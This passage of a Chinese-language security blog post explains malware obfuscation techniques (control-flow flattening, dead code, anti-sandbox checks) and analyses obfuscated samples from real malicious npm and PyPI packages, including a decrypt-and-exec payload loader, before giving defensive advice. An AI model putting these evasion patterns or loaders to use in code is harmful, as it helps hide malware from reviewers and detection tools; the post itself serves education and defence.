插入一些条件判断语句，其结果在混淆时是已知的（例如 <code class="custom-code">if (x*x &gt;= 0)</code> 总是为真，<code class="custom-code">if (1 === 0)</code> 总是为假），但对于分析工具或阅读者来说可能不那么直观。恶意代码可以被隐藏在这些看似永不执行或总是执行的分支中。</li><li><strong>控制流平坦化 (Control Flow Flattening)：</strong> 将原始代码块（如函数体内的语句序列）分解成许多小的代码片段，然后将这些片段放入一个大的 <code class="custom-code">switch</code> 语句或类似的调度结构中。通过一个状态变量来控制 <code class="custom-code">switch</code> 语句在不同片段之间的跳转。这使得原始的顺序、分支、循环结构变得模糊不清。</li><li><strong>无效代码插入：</strong> 在正常的代码块之间插入大量与程序逻辑无关的“垃圾”指令或调用，干扰分析。</li><li><strong>跳转表 (Jump Tables)：</strong> 使用函数指针数组或类似的机制，根据计算结果动态决定下一个要执行的代码块。</li></ul><div class="relative"><pre><code class="language-javascript code-highlight"><span class="code-line"><span class="token comment">// 简单示例：控制流平坦化 (概念)</span>
</span><span class="code-line"><span class="token keyword">let</span> state <span class="token operator">=</span> <span class="token number">0</span>
</span><span class="code-line"><span class="token keyword control-flow">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line">  <span class="token keyword control-flow">switch</span> <span class="token punctuation">(</span>state<span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line">    <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>
</span><span class="code-line">      <span class="token comment">// console.log(&quot;Step 1&quot;);</span>
</span><span class="code-line">      state <span class="token operator">=</span> <span class="token number">2</span> <span class="token comment">// 跳转到 case 2</span>
</span><span class="code-line">      <span class="token keyword control-flow">break</span>
</span><span class="code-line">    <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span> <span class="token comment">// 这个 case 可能永远不会被直接调用，或者通过复杂计算才到达</span>
</span><span class="code-line">      <span class="token comment">// window[&quot;e&quot; + &quot;val&quot;](&quot;alert(&#x27;malicious code&#x27;)&quot;); // 恶意代码</span>
</span><span class="code-line">      state <span class="token operator">=</span> <span class="token number">3</span>
</span><span class="code-line">      <span class="token keyword control-flow">break</span>
</span><span class="code-line">    <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
</span><span class="code-line">      <span class="token comment">// console.log(&quot;Step 2&quot;);</span>
</span><span class="code-line">      <span class="token keyword control-flow">if</span> <span class="token punctuation">(</span><span class="token function">someCondition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line">        <span class="token comment">// someCondition 可能是不透明谓词</span>
</span><span class="code-line">        state <span class="token operator">=</span> <span class="token number">1</span> <span class="token comment">// 条件满足则跳转到恶意代码</span>
</span><span class="code-line">      <span class="token punctuation">}</span> <span class="token keyword control-flow">else</span> <span class="token punctuation">{</span>
</span><span class="code-line">        state <span class="token operator">=</span> <span class="token number">3</span>
</span><span class="code-line">      <span class="token punctuation">}</span>
</span><span class="code-line">      <span class="token keyword control-flow">break</span>
</span><span class="code-line">    <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>
</span><span class="code-line">      <span class="token comment">// console.log(&quot;End&quot;);</span>
</span><span class="code-line">      <span class="token keyword control-flow">return</span>
</span><span class="code-line">  <span class="token punctuation">}</span>
</span><span class="code-line"><span class="token punctuation">}</span>
</span></code></pre></div><p>分析这种混淆需要耐心和使用专门的去混淆工具或调试器来追踪真实的执行路径。</p><h3 class="content-header" id="5-无用代码插入-dead-code-insertion"><a href="#5-无用代码插入-dead-code-insertion" aria-hidden="true" tabindex="-1"><span class="content-header-link"><svg class="h-5 linkicon w-5" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"></path><path d="M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"></path></svg></span></a>5. 无用代码插入 (Dead Code Insertion)</h3><p><strong>攻击者为何青睐此法：</strong> 无关的代码会分散分析人员的注意力，掩盖恶意负载，并可能使自动化检测工具产生误判或性能下降。</p><p><strong>如何帮助攻击者：</strong> 审查人员可能会花费时间分析这些无意义的代码片段，从而无意中忽略了真正的恶意指令。</p><p><strong>原理详解：</strong> 此技术涉及向源代码中添加大量永远不会被执行或执行结果不影响程序主要功能的代码。</p><ul><li><strong>永假条件块：</strong> <code class="custom-code">if (false) { ... }</code> 或 <code class="custom-code">if (1 &gt; 2) { ... }</code>。</li><li><strong>无法访问的代码：</strong> 在 <code class="custom-code">return</code> 语句之后，或在无限循环（没有 <code class="custom-code">break</code>）之后的代码。</li><li><strong>计算无用变量：</strong> 声明并计算一些变量，但这些变量后续从未使用过。</li><li><strong>调用无副作用的函数：</strong> 调用一些空函数或仅执行一些无关紧要操作的函数。</li></ul><div class="relative"><pre><code class="code-highlight language-java"><span class="code-line"><span class="token comment">// Java 示例：分散注意力的无关逻辑</span>
</span><span class="code-line"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">someMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line">  <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">,</span> c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
</span><span class="code-line">  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line">    c <span class="token operator">+=</span> <span class="token punctuation">(</span>a <span class="token operator">*</span> b<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 复杂的无用计算</span>
</span><span class="code-line">  <span class="token punctuation">}</span>
</span><span class="code-line">  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 永假条件</span>
</span><span class="code-line">    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;This will never be printed.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line">    <span class="token comment">// some_other_irrelevant_code();</span>
</span><span class="code-line">  <span class="token punctuation">}</span>
</span><span class="code-line">  <span class="token comment">// 真正的恶意逻辑可能隐藏在后面</span>
</span><span class="code-line">  <span class="token comment">// Runtime.getRuntime().exec(&quot;malicious command&quot;);</span>
</span><span class="code-line"><span class="token punctuation">}</span>
</span></code></pre></div><p>虽然这些代码不执行，但它们增加了代码的体积和复杂性，干扰了分析过程。</p><h3 class="content-header" id="6-基于环境的混淆检测-environment-based-obfuscationdetection"><a href="#6-基于环境的混淆检测-environment-based-obfuscationdetection" aria-hidden="true" tabindex="-1"><span class="content-header-link"><svg class="h-5 linkicon w-5" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"></path><path d="M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"></path></svg></span></a>6. 基于环境的混淆/检测 (Environment-Based Obfuscation/Detection)</h3><p><strong>攻击者为何青睐此法：</strong> 仅在特定环境条件下（如生产服务器、特定操作系统、检测到非调试环境）激活恶意软件，可以避免在受控的安全测试环境（沙箱、分析虚拟机）中被检测到。</p><p><strong>如何帮助攻击者：</strong> 恶意代码仅在目标环境中执行，从而成功规避了早期的检测和分析。</p><p><strong>原理详解：</strong> 恶意软件在执行前会检查其运行环境。如果环境符合其预设的“安全”或“目标”条件，则执行恶意负载；否则，它可能保持静默或执行一些无害的行为。</p><ul><li><strong>反沙箱/反虚拟机技术：</strong><ul><li>检测虚拟化软件的特定文件、注册表项、进程（如 <code class="custom-code">vmtoolsd.exe</code>）。</li><li>检测 CPU 特性或指令执行时间的差异（虚拟机通常比物理机慢）。</li><li>检测常见的分析工具进程（如 Wireshark, Process Explorer）。</li><li>检测调试器的存在（如通过 <code class="custom-code">IsDebuggerPresent()</code> API）。</li></ul></li><li><strong>时间延迟执行：</strong> 在系统启动或首次运行后等待一段较长的时间（如几小时或几天）再执行恶意行为，以期躲过沙箱的短期监控。</li><li><strong>用户活动检测：</strong> 检查鼠标移动、键盘输入、窗口交互等，确认是真实用户环境而非自动化分析环境。</li><li><strong>特定配置检测：</strong> 检查特定的域名、IP 地址、用户名、系统语言或是否存在某些特定文件，只在这些条件满足时激活。</li></ul><div class="relative"><pre><code class="code-highlight language-python"><span class="code-line"><span class="token keyword">import</span> os
</span><span class="code-line"><span class="token keyword">import</span> time
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># 简单的环境检测示例</span>
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">check_environment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    <span class="token comment"># 检测是否在虚拟机内 (简化示例，实际检测更复杂)</span>
</span><span class="code-line">    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">&quot;/.dockerenv&quot;</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token string">&quot;VMware&quot;</span> <span class="token keyword">in</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">&quot;systeminfo&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">        <span class="token keyword">return</span> <span class="token boolean">False</span> <span class="token comment"># 在虚拟机或 Docker 中，不激活</span>
</span><span class="code-line">
</span><span class="code-line">    <span class="token comment"># 检测是否有调试器 (概念)</span>
</span><span class="code-line">    <span class="token comment"># if is_debugger_present():</span>
</span><span class="code-line">    <span class="token comment">#    return False</span>
</span><span class="code-line">
</span><span class="code-line">    <span class="token comment"># 检测特定用户名</span>
</span><span class="code-line">    <span class="token comment"># if os.getlogin() == &quot;sandbox_user&quot;:</span>
</span><span class="code-line">    <span class="token comment">#    return False</span>
</span><span class="code-line">    <span class="token keyword">return</span> <span class="token boolean">True</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">malicious_payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Executing malicious payload...&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token comment"># ... 恶意代码 ...</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">if</span> os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">&#x27;APP_ENV&#x27;</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">&#x27;production&#x27;</span> <span class="token keyword">and</span> check_environment<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    <span class="token comment"># 仅在生产环境且通过环境检测后执行</span>
</span><span class="code-line">    <span class="token comment"># time.sleep(3600) # 延迟一小时执行</span>
</span><span class="code-line">    <span class="token comment"># exec(&quot;some_obfuscated_malicious_code_string&quot;)</span>
</span><span class="code-line">    malicious_payload<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token keyword">else</span><span class="token punctuation">:</span>
</span><span class="code-line">    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Running in a safe or non-target environment.&quot;</span><span class="token punctuation">)</span>
</span></code></pre></div><h2 class="content-header" id="从理论到现实混淆技术实战"><a href="#从理论到现实混淆技术实战" aria-hidden="true" tabindex="-1"><span class="content-header-link"><svg class="h-5 linkicon w-5" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"></path><path d="M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"></path></svg></span></a>从理论到现实：混淆技术实战</h2><p>以上讨论了多种理论上的混淆技术，但现实世界中的恶意混淆是什么样的呢？安全公司的研究团队（如原文提到的 Socket）在各种生态系统中发现了大量真实案例。以下是一些在 npm 和 PyPI 包中检测到的实际威胁，展示了攻击者如何应用这些混淆方法来逃避检测、利用漏洞并危及系统安全。</p><h3 class="content-header" id="npm-真实案例分析"><a href="#npm-真实案例分析" aria-hidden="true" tabindex="-1"><span class="content-header-link"><svg class="h-5 linkicon w-5" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"></path><path d="M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"></path></svg></span></a>npm 真实案例分析</h3><div class="relative"><pre><code class="language-javascript code-highlight"><span class="code-line"><span class="token comment">// let w = false; // 此变量在提供的片段中未使用，可能是更大代码块的一部分</span>
</span><span class="code-line"><span class="token comment">// const wait = () =&gt; { // wait 函数定义了一个复杂的立即执行函数表达式 (IIFE) 和Promise链</span>
</span><span class="code-line"><span class="token comment">// 	var _0x1262=[&#x27;\x74\x68\x65\x6e&#x27;]; // 1. 字符串数组混淆：将字符串 &#x27;then&#x27; 存储在数组中</span>
</span><span class="code-line"><span class="token comment">// 	(function(_0x1248e3,_0x53b88c){ // 2. IIFE 用于创建独立作用域，并可能进行数组移位/洗牌</span>
</span><span class="code-line"><span class="token comment">// 		var _0x1262eb=function(_0x27d80e){</span>
</span><span class="code-line"><span class="token comment">// 			while(--_0x27d80e){</span>
</span><span class="code-line"><span class="token comment">// 				_0x1248e3[&#x27;\x70\x75\x73\x68&#x27;](_0x1248e3[&#x27;\x73\x68\x69\x66\x74&#x27;]()); // 数组旋转/移位操作</span>
</span><span class="code-line"><span class="token comment">// 			}</span>
</span><span class="code-line"><span class="token comment">// 		};</span>
</span><span class="code-line"><span class="token comment">// 		_0x1262eb(++_0x53b88c); // 执行数组移位</span>
</span><span class="code-line"><span class="token comment">// 	}(_0x1262,0xfa)); // 0xfa = 250, 移位250次</span>
</span><span class="code-line"><span class="token comment">// 	var _0x27d8=function(_0x1248e3,_0x53b88c){ // 3. 间接函数调用：定义一个函数用于从数组中获取元素</span>
</span><span class="code-line"><span class="token comment">// 		_0x1248e3=_0x1248e3-0xf7; // 0xf7 = 247, 对索引进行计算</span>
</span><span class="code-line"><span class="token comment">// 		var _0x1262eb=_0x1262[_0x1248e3];</span>
</span><span class="code-line"><span class="token comment">// 		return _0x1262eb;</span>
</span><span class="code-line"><span class="token comment">// 	};</span>
</span><span class="code-line"><span class="token comment">// 	var _0x1ee609=_0x27d8; // 变量别名，增加追踪难度</span>
</span><span class="code-line"><span class="token comment">// 	Promise[&#x27;\x72\x65\x73\x6f\x6c\x76\x65&#x27;](()=&gt;{}) // 4. 属性访问混淆：Promise.resolve 通过字符串拼接访问</span>
</span><span class="code-line"><span class="token comment">// 		[&#x27;\x74\x68\x65\x6e&#x27;](()=&gt;{}) // Promise.then</span>
</span><span class="code-line"><span class="token comment">// 		[_0x1ee609(0xf7)](()=&gt;{}); // 实际调用 _0x27d8(247), 返回 _0x1262[0] 即 &#x27;then&#x27;</span>
</span><span class="code-line"><span class="token comment">// };</span>
</span></code></pre></div><p><strong>解读：</strong> 这段 JavaScript 代码是一个高度混淆的凭证窃取器。</p><ol><li><strong>字符串数组混淆与移位</strong>：字符串 <code class="custom-code">&#x27;then&#x27;</code> 被存储在 <code class="custom-code">_0x1262</code> 数组中。IIFE（立即执行函数表达式）对这个数组执行了多次移位操作（将第一个元素移到末尾），使得在静态分析时很难直接看出 <code class="custom-code">_0x1262[0]</code> 的原始值。</li><li><strong>间接函数调用与索引计算</strong>：函数 <code class="custom-code">_0x27d8</code> (别名为 <code class="custom-code">_0x1ee609</code>) 用于从移位后的数组中获取元素。注意 <code class="custom-code">_0x1248e3=_0x1248e3-0xf7;</code> 这一步，它对传入的参数（例子中是 <code class="custom-code">0xf7</code>）进行计算得到实际的数组索引。 <code class="custom-code">_0x1ee609(0xf7)</code> 会计算 <code class="custom-code">0xf7 - 0xf7 = 0</code>，所以最终访问的是移位后数组的第一个元素。</li><li><strong>属性访问混淆</strong>：<code class="custom-code">Promise</code> 对象的方法名（如 <code class="custom-code">resolve</code>, <code class="custom-code">then</code>）也是用编码后的字符串（如 <code class="custom-code">\x72...</code> for &#x27;resolve&#x27;, <code class="custom-code">\x74...</code> for &#x27;then&#x27;）或通过上面那个间接函数 <code class="custom-code">_0x1ee609(0xf7)</code> 来访问的。 <code class="custom-code">Promise[&#x27;\x72\x65\x73\x6f\x6c\x76\x65&#x27;]</code> 就是 <code class="custom-code">Promise.resolve</code>，<code class="custom-code">[&#x27;\x74\x68\x65\x6e&#x27;]</code> 就是 <code class="custom-code">.then</code>。最后的 <code class="custom-code">[_0x1ee609(0xf7)]</code> 也是 <code class="custom-code">.then</code>。</li><li><strong>整体行为推测</strong>：该代码创建了一个空 <code class="custom-code">Promise</code> 并连续调用 <code class="custom-code">.then</code>。这种结构本身可能无害，但通常在恶意软件中，这些空的 <code class="custom-code">()=&gt;{}</code> 回调函数会被替换为实际的恶意操作，或者这种链式调用被用作延时、环境检测或更复杂控制流的一部分。原文解释它实现了30分钟延迟后将窃取到的凭证发送到 <code class="custom-code">qooapp.herokuapp.com</code>。这种延迟和复杂的混淆手段都是为了逃避安全监控。</li></ol><h3 class="content-header" id="pypi-真实案例分析"><a href="#pypi-真实案例分析" aria-hidden="true" tabindex="-1"><span class="content-header-link"><svg class="h-5 linkicon w-5" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"></path><path d="M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"></path></svg></span></a>PyPI 真实案例分析</h3><div class="relative"><pre><code class="code-highlight language-python"><span class="code-line"><span class="token comment"># from fernet import Fernet # Fernet 是一个对称加密库</span>
</span><span class="code-line"><span class="token comment"># # 1. Base64编码的加密密钥 和 加密的恶意代码</span>
</span><span class="code-line"><span class="token comment"># key = b&#x27;J8YKnvPEPLZNRm_nw8eL-CmUYkSwyXgjw7lEhHGRbjs=&#x27;</span>
</span><span class="code-line"><span class="token comment"># encrypted_payload = b&#x27;gAAAAABmA1lfVy8Id9IYFHpxUElytS0hzBGFFBVfhPADNntNqVFk5lA4ihnrMrFXJUYrGuafAg8cXObYgzDxfgaQFsDsaDYgM5Whlh1x27fJAPE56R5LSQ-0RLrhjzVK-FW5OBXe3CaShMycB-4jI5SgaRmAnStca1mfniQm5PQ-YXATFnXQlsXtbNezHSLmIDY1OZ142ULls-37cF2OcT2PvKjN4USQA84-SxRToClOK4yGxGlSpjo=&#x27;</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># # 2. 运行时解密和执行</span>
</span><span class="code-line"><span class="token comment"># fernet_obj = Fernet(key)</span>
</span><span class="code-line"><span class="token comment"># decrypted_payload = fernet_obj.decrypt(encrypted_payload)</span>
</span><span class="code-line"><span class="token comment"># exec(decrypted_payload) # 3. 动态执行解密后的代码</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># # install.run(self) # 这行代码表明它可能混在 setup.py 或类似安装脚本中</span>
</span></code></pre></div><p><strong>解读：</strong> 这段 Python 代码展示了使用加密来隐藏恶意负载的典型模式。</p><ol><li><strong>加密负载</strong>：攻击者首先编写了恶意的 Python 代码，然后使用 Fernet 对称加密算法（或其他加密算法）将其加密。加密后的密文（<code class="custom-code">encrypted_payload</code>）和加密所用的密钥（<code class="custom-code">key</code>）被硬编码到发布的包中。注意，密钥和密文都以 <code class="custom-code">b&#x27;&#x27;</code> 开头，表示它们是字节串，这对于加密操作是必要的。</li><li><strong>运行时解密</strong>：当这段代码执行时，它首先用硬编码的密钥实例化一个 <code class="custom-code">Fernet</code> 对象。然后，调用该对象的 <code class="custom-code">decrypt</code> 方法，传入加密的负载，得到解密后的原始恶意 Python 代码（字节串形式）。</li><li><strong>动态执行</strong>：最后，使用 <code class="custom-code">exec()</code> 函数执行解密后的恶意代码。<code class="custom-code">exec()</code> 可以执行字符串形式的 Python 代码。</li></ol><p>这种方法的隐蔽性在于，静态分析工具扫描源代码时，只能看到加密的字节串和密钥，无法直接看到原始的恶意指令。只有在代码实际运行时，恶意代码才会被解密并执行。这使得基于签名的检测和简单的静态分析难以奏效。</p><h2 class="content-header" id="如何应对与防范"><a href="#如何应对与防范" aria-hidden="true" tabindex="-1"><span class="content-header-link"><svg class="h-5 linkicon w-5" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"></path><path d="M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"></path></svg></span></a>如何应对与防范？</h2><p>理解了这些混淆技术后，开发者和安全团队可以采取以下措施来加强防御：</p><ol><li><strong>增强代码审查意识</strong>：对于引入的第三方库，尤其是来自不知名来源或行为可疑的包，进行更严格的代码审查。注意寻找上述混淆技术的迹象。</li><li><strong>利用去混淆工具</strong>：社区和商业公司提供了一些针对特定语言（如 JavaScript）的去混淆工具或在线服务，可以帮助还原部分混淆代码。</li><li><strong>动态分析与沙箱检测</strong>：在隔离的环境（沙箱）中运行可疑代码，监控其网络活动、文件系统更改和API调用，有助于发现其真实行为，即使代码被混淆。</li><li><strong>行为监控与启发式分析</strong>：安全工具不应仅依赖静态签名，还应结合行为分析和启发式规则来检测可疑模式，例如动态代码执行、非预期的网络连接等。</li><li><strong>供应链安全工具</strong>：使用专门的软件供应链安全工具，它们通常集成了依赖分析、漏洞扫描以及对已知恶意包和混淆模式的检测。</li><li><strong>限制不必要的权限</strong>：遵循最小权限原则，确保应用程序仅拥有其执行核心功能所必需的权限，减少潜在恶意代码的影响范围。</li></ol><h2 class="content-header" id="结论"><a href="#结论" aria-hidden="true" tabindex="-1"><span class="content-header-link"><svg class="h-5 linkicon w-5" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z"></path><path d="M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z"></path></svg></span></a>结论</h2><p>代码混淆是恶意软件作者军火库中一个强大且常用的工具。通过将代码变得难以阅读和分析，他们试图在数字世界中隐藏其踪迹。然而，通过深入理解这些混淆技术的原理，并结合先进的检测工具和警惕的人工审查，我们可以更好地揭开这些“隐形”威胁的面纱，保护我们的软件和系统免受侵害。持续学习和适应攻击者不断演变的技术是打赢这场攻防战的关键。</p></div></div><div class="pb-6 pt-6 text-center text-gray-700 dark:text-gray-300" id="comment"></div><footer><div class="flex flex-col text-sm font-medium sm:flex-row sm:justify-between sm:text-base"><div class="pt-4 xl:pt-8"><a class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" aria-label="Previous post: 使用Zip炸弹保护您的Web服务器免受恶意爬虫攻击" href="/blog/security/zip-bombs-server-protection">← <!-- -->使用Zip炸弹保护您的Web服务器免受恶意爬虫攻击</a></div><div class="pt-4 xl:pt-8"><a class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" aria-label="Next post: 核心开发者的Git配置秘籍" href="/blog/tools/git-enhanced-configuration">核心开发者的Git配置秘籍<!-- --> →</a></div></div></footer></div></div></article></section></main><footer><div class="mt-16 flex flex-col items-center"><div class="mb-3 flex space-x-4"><a class="text-sm !text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="mailto:mainjaylai@outlook.com"><span class="sr-only">mail</span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" class="fill-current text-gray-700 hover:text-primary-500 dark:text-gray-200 dark:hover:text-primary-400 h-6 w-6"><path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z"></path><path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z"></path></svg></a><a class="text-sm !text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://github.com/mainjaylai"><span class="sr-only">github</span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="fill-current text-gray-700 hover:text-primary-500 dark:text-gray-200 dark:hover:text-primary-400 h-6 w-6"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"></path></svg></a><a class="text-sm !text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://gitlab.com/JayMain"><span class="sr-only">gitlab</span><svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 hover:text-primary-500 dark:text-gray-200 dark:hover:text-primary-400 h-6 w-6" width="200" height="200"><path d="M1022.08 579.712l-57.258667-176.426667-113.664-349.397333a19.413333 19.413333 0 0 0-36.992 0L700.501333 403.2H323.498667L209.877333 53.888C204.074667 35.84 178.56 35.84 172.8 